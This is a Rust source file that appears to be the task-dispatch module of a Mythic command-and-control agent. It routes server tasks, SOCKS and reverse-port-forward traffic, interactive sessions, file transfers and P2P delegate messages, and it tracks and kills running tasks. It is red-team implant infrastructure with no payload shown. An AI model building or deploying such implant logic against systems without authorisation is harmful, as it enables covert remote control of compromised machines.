use crate::commands;
use crate::responses;
use crate::structs::{
    AddInternalConnectionMessage, Alert, GetFileFromMythicStruct, InteractiveTaskMessage,
    InteractiveTaskType, Job, MythicMessageResponse, RemoveInternalConnectionMessage, Response,
    SendFileToMythicStruct, SocksMsg, Task, TaskData, TaskStub,
};
use crate::utils;
use base64::{engine::general_purpose::STANDARD as BASE64, Engine};
use serde_json::Value;
use std::collections::HashMap;
use std::sync::atomic::AtomicBool;
use std::sync::RwLock;
use tokio::sync::mpsc;

lazy_static::lazy_static! {
    /// Currently running tasks
    static ref RUNNING_TASKS: RwLock<HashMap<String, RunningTaskInfo>> = RwLock::new(HashMap::new());
}

/// Information about a running task (channels for routing responses back to it)
struct RunningTaskInfo {
    pub task_data: TaskData,
    pub receive_responses_tx: mpsc::Sender<Value>,
    pub file_transfers: std::sync::Mutex<HashMap<String, mpsc::Sender<Value>>>,
    pub interactive_task_input_tx: mpsc::Sender<InteractiveTaskMessage>,
    pub stop: std::sync::Arc<AtomicBool>,
}

/// Channels needed by the task system
pub struct TaskChannels {
    pub new_response_tx: mpsc::Sender<Response>,
    pub send_file_to_mythic_tx: mpsc::Sender<SendFileToMythicStruct>,
    pub get_file_from_mythic_tx: mpsc::Sender<GetFileFromMythicStruct>,
    pub add_internal_connection_tx: mpsc::Sender<AddInternalConnectionMessage>,
    pub remove_internal_connection_tx: mpsc::Sender<RemoveInternalConnectionMessage>,
    pub interactive_task_output_tx: mpsc::Sender<InteractiveTaskMessage>,
    pub new_alert_tx: mpsc::Sender<Alert>,
    pub from_mythic_socks_tx: mpsc::Sender<SocksMsg>,
    pub from_mythic_rpfwd_tx: mpsc::Sender<SocksMsg>,
}

/// Initialize the task system
pub fn initialize(channels: TaskChannels) {
    let (new_task_tx, new_task_rx) = mpsc::channel::<Task>(100);
    let (remove_task_tx, remove_task_rx) = mpsc::channel::<String>(10);

    // Spawn task management goroutines
    tokio::spawn(listen_for_new_task(new_task_rx));
    tokio::spawn(listen_for_remove_running_task(remove_task_rx));

    // Store channels in a static for HandleMessageFromMythic to use
    TASK_CHANNELS
        .set(TaskChannelsStatic {
            new_response_tx: channels.new_response_tx,
            send_file_to_mythic_tx: channels.send_file_to_mythic_tx,
            get_file_from_mythic_tx: channels.get_file_from_mythic_tx,
            add_internal_connection_tx: channels.add_internal_connection_tx,
            remove_internal_connection_tx: channels.remove_internal_connection_tx,
            interactive_task_output_tx: channels.interactive_task_output_tx,
            new_alert_tx: channels.new_alert_tx,
            from_mythic_socks_tx: channels.from_mythic_socks_tx,
            from_mythic_rpfwd_tx: channels.from_mythic_rpfwd_tx,
            new_task_tx,
            remove_task_tx,
        })
        .ok();
}

/// Static storage for task channels
static TASK_CHANNELS: std::sync::OnceLock<TaskChannelsStatic> = std::sync::OnceLock::new();

struct TaskChannelsStatic {
    new_response_tx: mpsc::Sender<Response>,
    send_file_to_mythic_tx: mpsc::Sender<SendFileToMythicStruct>,
    get_file_from_mythic_tx: mpsc::Sender<GetFileFromMythicStruct>,
    add_internal_connection_tx: mpsc::Sender<AddInternalConnectionMessage>,
    remove_internal_connection_tx: mpsc::Sender<RemoveInternalConnectionMessage>,
    interactive_task_output_tx: mpsc::Sender<InteractiveTaskMessage>,
    new_alert_tx: mpsc::Sender<Alert>,
    from_mythic_socks_tx: mpsc::Sender<SocksMsg>,
    from_mythic_rpfwd_tx: mpsc::Sender<SocksMsg>,
    new_task_tx: mpsc::Sender<Task>,
    remove_task_tx: mpsc::Sender<String>,
}

/// Process a message from Mythic - routes tasks, responses, socks, delegates, etc.
pub async fn handle_message_from_mythic(mythic_message: MythicMessageResponse) {
    let channels = match TASK_CHANNELS.get() {
        Some(c) => c,
        None => {
            utils::print_debug("Task channels not initialized");
            return;
        }
    };

    // Handle responses from Mythic (route to running tasks)
    if !mythic_message.responses.is_empty() {
        responses::update_last_message_time();
    }
    for r in &mythic_message.responses {
        if let Some(Value::String(task_id)) = r.get("task_id") {
            let tasks = RUNNING_TASKS.read().expect("Running tasks lock poisoned");
            if let Some(task_info) = tasks.get(task_id) {
                let raw = Value::Object(
                    r.iter()
                        .map(|(k, v)| (k.clone(), v.clone()))
                        .collect(),
                );

                // Check if this is a file transfer response
                if let Some(Value::String(tracking_uuid)) = r.get("tracking_uuid") {
                    let file_transfers = task_info.file_transfers.lock().unwrap();
                    if let Some(ft_tx) = file_transfers.get(tracking_uuid) {
                        let _ = ft_tx.try_send(raw);
                        continue;
                    }
                }

                let _ = task_info.receive_responses_tx.try_send(raw);
            }
        }
    }

    // Route socks messages
    if !mythic_message.socks.is_empty() {
        responses::update_last_message_time();
    }
    for socks in mythic_message.socks {
        if channels.from_mythic_socks_tx.try_send(socks).is_err() {
            utils::print_debug("Dropping socks message because channel is full");
        }
    }

    // Route rpfwd messages
    if !mythic_message.rpfwds.is_empty() {
        responses::update_last_message_time();
    }
    for rpfwd in mythic_message.rpfwds {
        if channels.from_mythic_rpfwd_tx.try_send(rpfwd).is_err() {
            utils::print_debug("Dropping rpfwd message because channel is full");
        }
    }

    // Route interactive task messages
    if !mythic_message.interactive_tasks.is_empty() {
        responses::update_last_message_time();
    }
    for interactive in mythic_message.interactive_tasks {
        let tasks = RUNNING_TASKS.read().expect("Running tasks lock poisoned");
        if let Some(task_info) = tasks.get(&interactive.task_id) {
            if task_info
                .interactive_task_input_tx
                .try_send(interactive.clone())
                .is_err()
            {
                utils::print_debug("Dropping interactive task message because channel is full");
            }
        } else {
            // Task no longer running - send error back
            let _ = channels
                .interactive_task_output_tx
                .try_send(InteractiveTaskMessage {
                    task_id: interactive.task_id,
                    data: BASE64.encode(b"Task no longer running\n"),
                    message_type: InteractiveTaskType::Error,
                });
        }
    }

    // Sort tasks by timestamp
    let mut tasks = mythic_message.tasks;
    if !tasks.is_empty() {
        responses::update_last_message_time();
        eprintln!("[sebastian] Dispatching {} tasks", tasks.len());
    }
    tasks.sort_by(|a, b| a.timestamp.partial_cmp(&b.timestamp).unwrap_or(std::cmp::Ordering::Equal));

    // Create and dispatch each task
    for task_data in tasks {
        eprintln!("[sebastian] Task: cmd={}, id={}", task_data.command, task_data.task_id);
        let (receive_rx_tx, receive_rx_rx) = mpsc::channel::<Value>(10);
        let (interactive_input_tx, interactive_input_rx) =
            mpsc::channel::<InteractiveTaskMessage>(50);
        let stop = std::sync::Arc::new(AtomicBool::new(false));

        // Store task info for response routing
        let task_info = RunningTaskInfo {
            task_data: task_data.clone(),
            receive_responses_tx: receive_rx_tx.clone(),
            file_transfers: std::sync::Mutex::new(HashMap::new()),
            interactive_task_input_tx: interactive_input_tx.clone(),
            stop: stop.clone(),
        };

        {
            let mut running = RUNNING_TASKS.write().expect("Running tasks lock poisoned");
            running.insert(task_data.task_id.clone(), task_info);
        }

        let job = Job {
            stop: AtomicBool::new(false),
            receive_responses: receive_rx_rx,
            send_responses: channels.new_response_tx.clone(),
            send_file_to_mythic: channels.send_file_to_mythic_tx.clone(),
            get_file_from_mythic: channels.get_file_from_mythic_tx.clone(),
            file_transfers: std::sync::Mutex::new(HashMap::new()),
            save_file_func: utils::save_to_memory,
            remove_saved_file: utils::remove_from_memory,
            get_saved_file: utils::get_from_memory,
            add_internal_connection_channel: channels.add_internal_connection_tx.clone(),
            remove_internal_connection_channel: channels.remove_internal_connection_tx.clone(),
            interactive_task_input_channel: interactive_input_rx,
            interactive_task_output_channel: channels.interactive_task_output_tx.clone(),
            new_alert_channel: channels.new_alert_tx.clone(),
            receive_responses_tx: receive_rx_tx,
        };

        let task = Task {
            data: task_data,
            job,
            remove_running_task: channels.remove_task_tx.clone(),
        };

        let _ = channels.new_task_tx.send(task).await;
    }

    // Handle delegate messages for P2P
    if !mythic_message.delegates.is_empty() {
        responses::update_last_message_time();
        utils::p2p::handle_delegate_message_for_internal_p2p_connections(&mythic_message.delegates);
    }
}

/// Listen for new tasks and dispatch to command handlers
async fn listen_for_new_task(mut rx: mpsc::Receiver<Task>) {
    while let Some(task) = rx.recv().await {
        let command = task.data.command.clone();
        let task_id = task.data.task_id.clone();
        utils::print_debug(&format!("Dispatching command: {} (task: {})", command, task_id));

        tokio::spawn(async move {
            commands::dispatch(task).await;
        });
    }
}

/// Listen for task removal signals
async fn listen_for_remove_running_task(mut rx: mpsc::Receiver<String>) {
    while let Some(task_id) = rx.recv().await {
        let mut running = RUNNING_TASKS.write().expect("Running tasks lock poisoned");
        running.remove(&task_id);
        utils::print_debug(&format!("Removed task: {}", task_id));
    }
}

/// Get list of currently running tasks
pub fn get_running_tasks() -> Vec<TaskStub> {
    let running = RUNNING_TASKS.read().expect("Running tasks lock poisoned");
    running
        .values()
        .map(|info| TaskStub {
            command: info.task_data.command.clone(),
            params: info.task_data.params.clone(),
            id: info.task_data.task_id.clone(),
        })
        .collect()
}

/// Kill a running task by task ID
pub fn kill_task(task_id: &str) -> bool {
    let running = RUNNING_TASKS.read().expect("Running tasks lock poisoned");
    if let Some(task_info) = running.get(task_id) {
        task_info
            .stop
            .store(true, std::sync::atomic::Ordering::Relaxed);
        true
    } else {
        false
    }
}
